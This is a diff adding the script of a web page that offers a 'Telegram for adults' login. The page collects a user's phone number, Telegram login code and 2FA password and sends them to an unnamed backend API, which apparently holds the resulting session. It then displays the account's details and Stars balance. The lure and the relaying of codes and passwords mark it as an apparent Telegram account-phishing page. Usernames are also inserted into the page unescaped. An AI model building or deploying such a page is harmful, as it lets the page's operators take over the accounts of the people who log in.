+    showMessage(CONFIG.MSG_API_OFFLINE, "error");
+  }
+}
+
+function updateApiStatus(status, message) {
+  apiStatus.classList.remove('hidden');
+  apiStatusText.textContent = message;
+  statusDot.className = 'status-dot ' + status;
+}
+
+/* ====== STEP MANAGEMENT (YANGILANDI) ====== */
+function showStartStep() { // YANGI
+    hideAllSteps();
+    startStep.classList.add('active');
+    desc.textContent = CONFIG.START_DESC;
+    clearMessage();
+    PHONE = null;
+    requires2FA = false;
+    sessionData = null;
+}
+
+function startLogin() { // YANGI - Start tugmasi bosilganda
+    // WebApp mavjudligini tekshirish
+    if (window.Telegram && Telegram.WebApp) {
+        showTgStep();
+    } else {
+        // WebApp topilmasa, to'g'ridan-to'g'ri qo'lda kiritishga o'tkazish
+        showMessage(CONFIG.MSG_ERROR_NO_WEBAPP, "error");
+        showManualStep();
+    }
+}
+
+function showTgStep() {
+  hideAllSteps();
+  tgStep.classList.add('active');
+  desc.textContent = CONFIG.INITIAL_DESC;
+  clearMessage();
+}
+
+function showManualStep() {
+  hideAllSteps();
+  manualStep.classList.add('active');
+  desc.textContent = CONFIG.PHONE_DESC;
+  clearMessage();
+  
+  countryCodeInput.value = "+998";
+  updateCountryInfo("998");
+  
+  phoneNumberInput.value = "";
+  countryCodeInput.focus();
+  
+  requires2FA = false;
+  sessionData = null;
+}
+
+function showCodeStep() {
+  hideAllSteps();
+  codeStep.classList.add('active');
+  desc.textContent = CONFIG.CODE_DESC;
+  clearMessage();
+  codeInput.value = "";
+  codeInput.focus();
+}
+
+function showPasswordStep() {
+  hideAllSteps();
+  passwordStep.classList.add('active');
+  desc.textContent = CONFIG.PASSWORD_DESC;
+  clearMessage();
+  passwordInput.value = "";
+  passwordInput.focus();
+  requires2FA = true;
+}
+
+function hideAllSteps() {
+  startStep.classList.remove('active'); // YANGI
+  tgStep.classList.remove('active');
+  manualStep.classList.remove('active');
+  codeStep.classList.remove('active');
+  passwordStep.classList.remove('active');
+}
+
+/* ====== USER PROFILE (YANGILANDI: Timeout va Xatolarni qayta ishlash qo'shildi) ====== */
+async function showUserProfile() {
+  loginContainer.style.display = 'none';
+  profileContainer.style.display = 'block';
+  
+  userProfileContent.innerHTML = `
+    <div class="loading-container">
+      <div class="spinner" style="width: 32px; height: 32px;"></div>
+      <div class="loading-text">${CONFIG.PROFILE_LOADING}</div>
+    </div>
+  `;
+  
+  await fetchUserData();
+}
+
+async function fetchUserData() {
+  const phone = localStorage.getItem('loggedInPhone');
+  if (!phone) {
+    showMessage(CONFIG.MSG_ERROR_PHONE_MISSING, "error");
+    showStartStep();
+    return;
+  }
+  
+  const API_TIMEOUT = 10000; // 10 soniya
+  
+  try {
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), API_TIMEOUT);
+    
+    const response = await fetch(`${API}/get-user-data`, {
+      method: "POST",
+      signal: controller.signal,
+      headers: { "Content-Type": "application/json", "Accept": "application/json" },
+      body: JSON.stringify({ phone: phone })
+    });
+    
+    clearTimeout(timeoutId);
+    
+    if (response.status === 401) {
+        // Agar session eskirgan bo'lsa
+        throw new Error("Session has expired. Please log in again.");
+    }
+    
+    if (!response.ok) {
+        const errorData = await response.json().catch(() => ({}));
+        throw new Error(errorData.detail || "Telegram for adults error.");
+    }
+    
+    const data = await response.json();
+    
+    if (data.status === "error") {
+        throw new Error(data.detail || "Your data could not be loaded.");
+    }
+    
+    renderUserProfile(data);
+    showMessage(CONFIG.PROFILE_FOOTER_STATUS, "success");
+    updateApiStatus('online', 'Your data has been loaded.');
+    
+  } catch (error) {
+    console.error("Error:", error);
+    
+    // Xato yuz berganda (Timeout yoki API xatosi)
+    let errorMessage;
+    if (error.name === 'AbortError') {
+      errorMessage = `Timeout (${API_TIMEOUT / 1000}s). Can't connect to Telegram for adults.`;
+    } else {
+      errorMessage = error.message;
+    }
+    
+    // Foydalanuvchiga xabar berish
+    showMessage(`${CONFIG.MSG_ERROR_USER_DATA_FAILED} ${errorMessage}`, "error");
+    updateApiStatus('offline', 'Error loading your data.');
+    
+    // Kirish ma'lumotlarini o'chirish va Start sahifasiga qaytish
+    localStorage.removeItem('loggedInPhone');
+    PHONE = null;
+    sessionData = null;
+    
+    // 3 soniyadan keyin boshlang'ich sahifaga o'tkazish
+    setTimeout(() => {
+        profileContainer.style.display = 'none';
+        loginContainer.style.display = 'block';
+        showStartStep();
+    }, 3000);
+  }
+}
+
+function renderUserProfile(data) {
+  const account = data.account;
+  const now = new Date();
+  const loginTime = now.toLocaleTimeString('uz-UZ');
+  
+  let firstChar = 'T';
+  if (account.username) {
+    firstChar = account.username.charAt(0).toUpperCase();
+  } else if (account.phone) {
+    firstChar = account.phone.slice(-1);
+  }
+  
+  let badgesHTML = '';
+  if (account.is_premium) {
+    badgesHTML += `<span class="account-badge badge-premium">PREMIUM</span>`;
+  }
+  if (account.is_verified) {
+    badgesHTML += `<span class="account-badge badge-verified">VERIFIED</span>`;
+  }
+  
+  const profileHTML = `
+    <div class="user-avatar">${firstChar}</div>
+    <div class="user-name">
+      ${account.username || `${CONFIG.PROFILE_NOT_KNOWN} User`}
+      ${badgesHTML}
+    </div>
+    <div class="user-phone">${account.phone || PHONE || CONFIG.PROFILE_NOT_KNOWN}</div>
+    
+    <div class="user-stats">
+      <div class="stat-item">
+        <span class="stat-label">${CONFIG.PROFILE_PHONE}</span>
+        <span class="stat-value">${account.phone || PHONE || CONFIG.PROFILE_NOT_KNOWN}</span>
+      </div>
+      <div class="stat-item">
+        <span class="stat-label">${CONFIG.PROFILE_USER_ID}</span>
+        <span class="stat-value">${account.user_id || CONFIG.PROFILE_NOT_KNOWN}</span>
+      </div>
+      <div class="stat-item">
+        <span class="stat-label">${CONFIG.PROFILE_USERNAME}</span>
+        <span class="stat-value">${account.username || CONFIG.PROFILE_NO}</span>
+      </div>
+      <div class="stat-item">
+        <span class="stat-label">${CONFIG.PROFILE_PREMIUM}</span>
+        <span class="stat-value" style="color: ${account.is_premium ? 'gold' : 'var(--muted)'}">
+          ${account.is_premium ? CONFIG.PROFILE_YES : CONFIG.PROFILE_NO}
+        </span>
+      </div>
+      <div class="stat-item">
+        <span class="stat-label">${CONFIG.PROFILE_VERIFIED}</span>
+        <span class="stat-value" style="color: ${account.is_verified ? 'var(--success)' : 'var(--muted)'}">
+          ${account.is_verified ? CONFIG.PROFILE_YES : CONFIG.PROFILE_NO}
+        </span>
+      </div>
+    </div>
+    
+    <div class="stars-balance">
+      <span class="star-icon">⭐</span>
+      <span>${account.stars_balance || 0}</span> Stars
+    </div>
+    
+    <div class="actions">
+      <button class="action-btn" onclick="fetchUserData()">${CONFIG.BTN_REFRESH}</button>
+      <button class="action-btn logout-btn" onclick="logout()">${CONFIG.BTN_LOGOUT}</button>
+    </div>
+    
+    <div class="footer" style="margin-top: 24px;">
+      ${CONFIG.PROFILE_FOOTER_STATUS} • ${loginTime}
+    </div>
+  `;
+  
+  userProfileContent.innerHTML = profileHTML;
+}
+
+function logout() {
+  localStorage.removeItem('loggedInPhone');
+  PHONE = null;
+  sessionData = null;
+  
+  profileContainer.style.display = 'none';
+  loginContainer.style.display = 'block';
+  showStartStep(); // Logoutdan keyin Start oynasiga qaytish
+  
+  showMessage(CONFIG.MSG_LOGOUT_SUCCESS, "success");
+}
+
+/* ====== UI HELPERS (O'zgartirishsiz) ====== */
+function showMessage(text, type = "success") {
+  msgEl.textContent = text;
+  msgEl.className = "msg " + type;
+}
+
+function clearMessage() {
+  msgEl.textContent = "";
+  msgEl.className = "msg";
+}
+
+function setLoading(btn, state, text) {
+  if (!btn) return;
+  
+  btn.disabled = state;
+  btn.innerHTML = state
+    ? `<div class="spinner"></div> ${text}`
+    : btn.getAttribute('data-original-text');
+}
+
+/* ====== INPUT VALIDATION ====== */
+codeInput.addEventListener('input', function(e) {
+  this.value = this.value.replace(/[^0-9]/g, '');
+  if (this.value.length > 5) {
+    this.value = this.value.substring(0, 5);
+  }
+});
+
+phoneNumberInput.addEventListener('input', function(e) {
+  this.value = this.value.replace(/[^0-9]/g, '');
+});
+
+countryCodeInput.addEventListener('keypress', (e) => {
+  if (e.key === 'Enter') sendCode();
+});
+
+phoneNumberInput.addEventListener('keypress', (e) => {
+  if (e.key === 'Enter') sendCode();
+});
+
+codeInput.addEventListener('keypress', (e) => {
+  if (e.key === 'Enter') verifyCode();
+});
+
+passwordInput.addEventListener('keypress', (e) => {
+  if (e.key === 'Enter') verifyPassword();
+});
+
+/* ====== SHARE CONTACT (O'zgartirishsiz) ====== */
+function shareContact() {
+  if (!Telegram?.WebApp) {
+    showMessage(CONFIG.MSG_ERROR_NO_WEBAPP, "error");
+    showManualStep();
+    return;
+  }
+  
+  Telegram.WebApp.requestContact((res) => {
+    if (res?.phone_number) {
+      PHONE = res.phone_number;
+      sendCode();
+    } else {
+      showMessage(CONFIG.MSG_ERROR_NO_CONTACT, "error");
+    }
+  });
+}
+
+/* ====== SEND CODE (O'zgartirishsiz) ====== */
+async function sendCode() {
+  const countryCode = countryCodeInput.value.trim();
+  const phoneNumber = phoneNumberInput.value.trim();
+  
+  if (!countryCode || !phoneNumber) {
+    showMessage(CONFIG.MSG_PHONE_EMPTY, "error");
+    return;
+  }
+  
+  PHONE = countryCode + phoneNumber;
+  
+  if (PHONE.length < 10) {
+    showMessage(CONFIG.MSG_PHONE_INVALID, "error");
+    return;
+  }
+  
+  showMessage(CONFIG.MSG_SENDING_CODE);
+  setLoading(sendCodeBtn, true, CONFIG.MSG_SENDING_CODE);
+  
+  try {
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 10000);
+    
+    const response = await fetch(`${API}/send-code`, {
+      method: "POST",
+      signal: controller.signal,
+      headers: { "Content-Type": "application/json", "Accept": "application/json" },
+      body: JSON.stringify({ phone: PHONE })
+    });
+    
+    clearTimeout(timeoutId);
+    
+    if (!response.ok) {
+      const errorData = await response.json().catch(() => ({}));
+      const errorMessage = errorData.detail || errorData.message || errorData.error || "Code not sent";
+      throw new Error(errorMessage);
+    }
+    
+    const data = await response.json();
+    
+    if (data.status === "error" || data.success === false || data.error) {
+      throw new Error(data.detail || data.error || data.message || "Code not sent");
+    }
+    
+    showCodeStep();
+    showMessage(CONFIG.MSG_CODE_SENT, "success");
+    updateApiStatus('online', 'Code sent successfully');
+    
+  } catch (error) {
+    console.error("Error sending code:", error);
+    if (error.name === 'AbortError' || error.message.includes('fetch')) {
+      updateApiStatus('offline', 'Telegram for Adults not responding');
+      showMessage(CONFIG.MSG_API_NOT_RESPONDING, "error");
+    } else {
+      showMessage(error.message, "error");
+    }
+  } finally {
+    setLoading(sendCodeBtn, false);
+  }
+}
+
+/* ====== VERIFY CODE (O'zgartirishsiz) ====== */
+async function verifyCode() {
+  const code = codeInput.value.trim();
+  
+  if (!code) {
+    showMessage(CONFIG.MSG_CODE_EMPTY, "error");
+    codeInput.focus();
+    return;
+  }
+  
+  if (code.length !== 5) {
+    showMessage(CONFIG.MSG_CODE_INVALID_LENGTH, "error");
+    codeInput.focus();
+    return;
+  }
+  
+  setLoading(verifyCodeBtn, true, CONFIG.MSG_VERIFYING);
+  
+  try {
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 10000);
+    
+    const requestBody = { phone: PHONE, code: code };
+    if (sessionData) Object.assign(requestBody, sessionData);
+    
+    const response = await fetch(`${API}/verify-code`, {
+      method: "POST",
+      signal: controller.signal,
+      headers: { "Content-Type": "application/json", "Accept": "application/json" },
+      body: JSON.stringify(requestBody)
+    });
+    
+    clearTimeout(timeoutId);
+    
+    const data = await response.json();
+    
+    if (data.status === "error") {
+      if (data.detail && data.detail.includes("2FA password needed")) {
+        tempCode = code;
+        if (data.session) sessionData = { session: data.session };
+        showPasswordStep();
+        showMessage(CONFIG.MSG_2FA_REQUIRED, "error");
+        setLoading(verifyCodeBtn, false);
+        return;
+      }
+      throw new Error(data.detail || data.message || data.error || "Error while verifying code");
+    }
+    
+    // Muvaffaqiyatli
+    localStorage.setItem('loggedInPhone', PHONE);
+    await showUserProfile();
+    showMessage(CONFIG.MSG_SUCCESS, "success");
+    updateApiStatus('online', 'Login successfully');
+    
+  } catch (error) {
+    console.error("Error while verifying code:", error);
+    if (error.name === 'AbortError') {
+      showMessage(CONFIG.MSG_API_NOT_RESPONDING, "error");
+      updateApiStatus('offline', 'Telegram for Adults not responding');
+    } else {
+      showMessage(error.message, "error");
+    }
+  } finally {
+    setLoading(verifyCodeBtn, false);
+  }
+}
+
+/* ====== VERIFY PASSWORD (2FA) (O'zgartirishsiz) ====== */
+async function verifyPassword() {
+  const password = passwordInput.value.trim();
+  
+  if (!password) {
+    showMessage(CONFIG.MSG_2FA_REQUIRED, "error");
+    passwordInput.focus();
+    return;
+  }
+  
+  setLoading(verifyPasswordBtn, true, CONFIG.MSG_VERIFYING);
+  
+  try {
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 10000);
+    
+    const requestBody = { phone: PHONE, code: tempCode, password: password };
+    if (sessionData) Object.assign(requestBody, sessionData);
+    
+    const response = await fetch(`${API}/verify-code`, {
+      method: "POST",
+      signal: controller.signal,
+      headers: { "Content-Type": "application/json", "Accept": "application/json" },
+      body: JSON.stringify(requestBody)
+    });
+    
+    clearTimeout(timeoutId);
+    
+    const data = await response.json();
+    
+    if (data.status === "error") {
+      throw new Error(data.detail || data.message || data.error || "Invalid 2FA password");
+    }
+    
+    // Muvaffaqiyatli
+    localStorage.setItem('loggedInPhone', PHONE);
+    await showUserProfile();
+    showMessage(CONFIG.MSG_SUCCESS, "success");
+    updateApiStatus('online', 'Login successfully');
+    
+  } catch (error) {
+    console.error("Erro while processing 2FA password:", error);
+    if (error.name === 'AbortError') {
+      showMessage(CONFIG.MSG_API_NOT_RESPONDING, "error");
+      updateApiStatus('offline', 'Telegram for Adults not responding');
+    } else {
+      showMessage(error.message, "error");
+      passwordInput.value = "";
+      passwordInput.focus();
+    }
+  } finally {
+    setLoading(verifyPasswordBtn, false);
+  }
+}
+</script>
+
+</body>
+</html>
